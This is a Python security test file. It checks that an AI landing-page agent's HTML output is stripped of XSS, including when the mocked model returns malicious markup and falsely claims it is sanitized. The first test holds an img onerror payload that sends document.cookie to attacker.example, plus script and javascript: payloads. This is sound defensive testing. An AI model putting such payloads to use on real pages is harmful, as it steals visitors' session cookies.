"""Landing-page prompt-injection — payloads forcing HTML XSS must be sanitized."""
from __future__ import annotations

import pytest

pytestmark = [pytest.mark.security, pytest.mark.asyncio]


async def test_landing_html_sanitized_in_after_model(monkeypatch, mock_gemini) -> None:
    from agents.landing_page_agent import landing_page_agent
    from services import gemini_client, image_service, sanitization
    from tests.test_agents._helpers import populated_state

    raw_xss = (
        '<section><h1>Tally</h1>'
        '<script>alert(1)</script>'
        '<img src=x onerror="fetch(\'https://attacker.example?c=\'+document.cookie)">'
        '<a href="javascript:alert(1)">go</a>'
        '<p>' + ("safe " * 80) + '</p>'
        '</section>'
    )

    async def _call(*, model, prompt, response_schema, grounded=False, temperature=0.4):
        return {
            "html_sanitized": raw_xss,  # adversarial: pretends sanitized
            "css": "section{padding:1rem}",
            "title": "Tally",
            "meta_description": "x",
            "og_tags": {"og:title": "Tally"},
        }, 100, 100, False

    async def _imagen(**_kw):
        return None

    monkeypatch.setattr(gemini_client, "call_gemini_structured", _call, raising=False)
    monkeypatch.setattr(image_service, "generate_hero_images", _imagen, raising=False)
    # Real sanitizer (don't stub): the after_model must clean the actual XSS.

    state = populated_state()
    result = await landing_page_agent.run(state)
    cleaned = result.output.html_sanitized.lower()
    assert "<script" not in cleaned
    assert " onerror" not in cleaned
    assert "javascript:" not in cleaned


async def test_html_sanitization_function_strips_xss() -> None:
    """Direct test on sanitize_html with mixed payload."""
    from services.sanitization import sanitize_html

    raw = '<section><script>x()</script><p onclick="bad()">hi</p></section>'
    cleaned = sanitize_html(raw).lower()
    assert "<script" not in cleaned
    assert "onclick" not in cleaned
